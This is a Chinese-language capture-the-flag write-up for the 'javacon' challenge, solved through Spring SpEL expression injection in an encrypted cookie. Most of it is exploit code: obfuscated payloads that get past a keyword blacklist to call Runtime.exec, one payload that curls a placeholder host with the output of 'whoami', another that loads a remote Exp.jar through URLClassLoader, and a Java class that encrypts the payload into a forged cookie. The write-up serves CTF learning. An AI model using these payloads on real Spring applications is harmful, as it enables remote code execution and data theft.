# P牛-Code-Breaking Puzzles-javacon

#

先判断输入的用户密码

![](image/image_7Ew0XG6Lek.png)

之后访问的时候，都会解密cookie中的值，然后获取用户名，并调用getAdvanceValue处理：

![](image/image_S-_nDakaTj.png)

表达式注入，但是有黑名单：

![](image/image_dU6HO-uqjg.png)

![](image/image_Bidigej1zC.png)

黑名单内容：

![](image/image_aRyCXYlWIA.png)

```java
"".class.forName("javax.script.Scrip".concat("tEngineManager")).newInstance().getEngineByName('js').eval("java.la".concat("ng.Run").concat("time.getR").concat("untime().exec('open -a Calculator')"))


#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"/bin/bash","-c","curl http://xxx?a=`whoami`"})}

new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://ip:prot/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance()

```

看下区别：

```java
        ParserContext parserContext = new TemplateParserContext();
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(cmdStr, parserContext);
        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
        exp.getValue(evaluationContext).toString();

//        ExpressionParser parser = new SpelExpressionParser();//创建解析器
//        Expression exp = parser.parseExpression(cmdStr);//解析表达式
//        System.out.println( exp.getValue() );//弹出计算器
```

这两段代码的主要区别在于**使用了不同的解析上下文 (****`ParserContext`****) 和表达式上下文 (****`EvaluationContext`****)**，具体如下

**上面的代码：**

#### 1. 使用 `TemplateParserContext`

- **`TemplateParserContext`** 是 Spring 提供的一种模板解析器上下文，通常用于处理模板表达式（如 `#{}` 或 `${}` 形式的占位符）。
- **`cmdStr`** 是表达式字符串，它可能包含占位符或模板语法。例如：`"Hello, #{name}"`。
- **效果**：
  - 在这种模式下，Spring 允许解析类似模板的表达式，支持动态插值（如将占位符替换为上下文中的值）。

**下面的代码：**

#### 1. 未使用 `ParserContext`

- 直接解析 `cmdStr`，没有引入模板解析上下文。
- **`cmdStr`** 必须是一个标准的 SpEL 表达式，例如：`"T(java.lang.Runtime).getRuntime().exec('open -a Calculator')"`。

#### 2. 未使用自定义上下文

- 这里直接调用 `exp.getValue()`，使用的是默认的上下文。这种情况下，表达式中不能引用自定义变量或方法，因为没有提供额外的上下文信息。

所以最终的payload:

```java
#{"".class.forName("javax.script.Scrip".concat("tEngineManager")).newInstance().getEngineByName('js').eval("java.la".concat("ng.Run").concat("time.getR").concat("untime().ex").concat("ec('open -a Calculator')"))}
```

```java
package org.example;

import io.tricking.challenge.Encryptor;
import io.tricking.challenge.spel.SmallEvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.ParserContext;
import org.springframework.expression.common.TemplateParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
    public static void main(String[] args) {
        String cmdStr= "#{\"\".class.forName(\"javax.script.Scrip\".concat(\"tEngineManager\")).newInstance().getEngineByName('js').eval(\"java.la\".concat(\"ng.Run\").concat(\"time.getR\").concat(\"untime().ex\").concat(\"ec('open -a Calculator')\"))}";
        System.out.println(Encryptor.encrypt("c0dehack1nghere1","0123456789abcdef",cmdStr));
//        ParserContext parserContext = new TemplateParserContext();
//        ExpressionParser parser = new SpelExpressionParser();
//        Expression exp = parser.parseExpression(cmdStr, parserContext);
//        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
//        exp.getValue(evaluationContext).toString();

//        ExpressionParser parser = new SpelExpressionParser();//创建解析器
//        Expression exp = parser.parseExpression(cmdStr);//解析表达式
//        System.out.println( exp.getValue() );//弹出计算器

//        String string1= "\"\".class.forName(\"javax.script.Scrip\".concat(\"tEngineManager\")).newInstance().getEngineByName('js').eval(\"java.la\".concat(\"ng.Run\").concat(\"time.getR\").concat(\"untime().ex\").concat(\"ec('open -a Calculator')\"))";

    }
}
```

rce:

![](image/image_W-kxxGiM1F.png)
